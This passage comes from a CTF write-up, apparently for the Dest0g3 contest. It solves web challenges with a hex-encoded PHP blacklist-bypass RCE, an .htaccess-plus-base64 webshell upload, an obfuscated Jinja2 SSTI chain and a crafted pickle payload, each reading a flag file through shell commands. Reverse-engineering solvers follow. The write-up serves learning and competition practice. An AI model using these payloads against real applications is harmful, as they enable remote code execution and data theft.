class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = date(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$fl4g</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>异常处理函数 <code>use()</code> 中输出flag，传参时传入数组即可触发异常：<code>ctf[]=1</code>。</p><p>​    </p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_ireplace(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>黑名单绕过rce，用16进制编码绕过：<code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;);</code></p><p>​    </p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>文件上传后缀白名单绕过，利用.htaccess文件实现非PHP文件解析成PHP代码执行。</p><p>先上传 <code>.htaccess</code> 文件，由于文件中不能包含 <code>&lt;?</code> ，用PHP伪协议base64解码处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>再上传base64编码后的 <code>shell.xxx</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7</span><br></pre></td></tr></table></figure><p>访问 <code>shell.xxx</code>，其中内容 <code>&lt;?php print_r(file_get_contents(&#39;/flag&#39;));</code> 以PHP代码执行，得到flag。</p><p>​    </p><h3 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h3><p>登录框随便输入账号密码，进入 <code>Hello xxx</code> 界面，尝试更换账号为 <code>&#123;&#123;2*3&#125;&#125;</code>，出现 <code>Hello 6</code>，可利用SSTI注入rce。</p><p>Fuzz发现过滤了很多符号，包括 <code>request _ &#39; &quot; [ . 空格 class getitem import</code> 等，不过 <code>config</code> 可用，可从 <code>&#123;&#123;config&#125;&#125;</code> 内容字符串中找到所需字符来拼接构造字符串，可以避免用到引号；过滤的关键词使用 <code>dict(cla=aa,ss=bb)|join()</code> 形式绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _</span></span><br><span class="line">config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 空格</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># /</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__</span></span><br><span class="line">(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.__class__.__init__.__globals__</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(geti=aa,tem=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)(<span class="built_in">dict</span>(o=aa,s=bb)|join())|attr(<span class="built_in">dict</span>(po=aa,pen=bb)|join())(<span class="built_in">dict</span>(c=aa,at=bb)|join()+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)+<span class="built_in">dict</span>(fl=aa,ag=bb)|join())|attr(<span class="built_in">dict</span>(re=aa,ad=bb)|join())()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flask框架，用到python反序列化，参考<a href="https://www.ieven762.cn/index.php/archives/109/">巅峰极客2021 - what_pickle</a>，限制了加载的模块只能为 <code>config</code> 里的，名字不能有 <code>__</code>，但是可以通过 <code>config</code> 的 <code>backdoor(cmd)</code> 函数绕过。</p><p>这题简化了 <code>backdoor(cmd)</code> 函数的使用条件，直接调用即可。利用pker构造opcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>base64编码opcode，传参：</p><p><code>data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3><blockquote><p>简单的加密</p></blockquote><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">247</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i + <span class="number">36</span>] = v5[i];</span><br><span class="line">    v4[i] = v6 ^ (v4[i + <span class="number">36</span>] + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x23</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != result_0[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j == <span class="number">35</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先加下标值再异或247，最后校验密文，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">206</span>, <span class="number">117</span>, <span class="number">207</span>, <span class="number">156</span>, <span class="number">154</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">184</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">141</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">163</span>, <span class="number">156</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">87</span>]</span><br><span class="line">flag = [(c[i]^<span class="number">247</span>)-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> enc[<span class="number">45</span>]; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">109</span>;</span><br><span class="line">  fwrite(<span class="string">&quot;input: &quot;</span>, <span class="number">1uLL</span>, <span class="number">7uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(str) != <span class="number">45</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">23</span> * str[i];</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) != enc[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密逻辑中 <code>((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24)</code> 互减抵消，剩下 <code>23 * str[i] + x[i] == enc[i]</code>，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc = [<span class="number">151</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">122</span>, <span class="number">142</span>, <span class="number">159</span>, <span class="number">70</span>, <span class="number">189</span>, <span class="number">96</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">243</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">73</span>, <span class="number">247</span>, <span class="number">14</span>, <span class="number">227</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">44</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">65</span>, <span class="number">152</span>, <span class="number">57</span>, <span class="number">169</span>, <span class="number">181</span>, <span class="number">229</span>, <span class="number">17</span>, <span class="number">116</span>, <span class="number">14</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">139</span>, <span class="number">165</span>, <span class="number">109</span>]</span><br><span class="line">x = [<span class="number">123</span>, <span class="number">81</span>, <span class="number">243</span>, <span class="number">90</span>, <span class="number">204</span>, <span class="number">57</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">28</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">247</span>, <span class="number">253</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">112</span>, <span class="number">177</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">37</span>, <span class="number">237</span>, <span class="number">145</span>, <span class="number">177</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">130</span>, <span class="number">230</span>, <span class="number">231</span>, <span 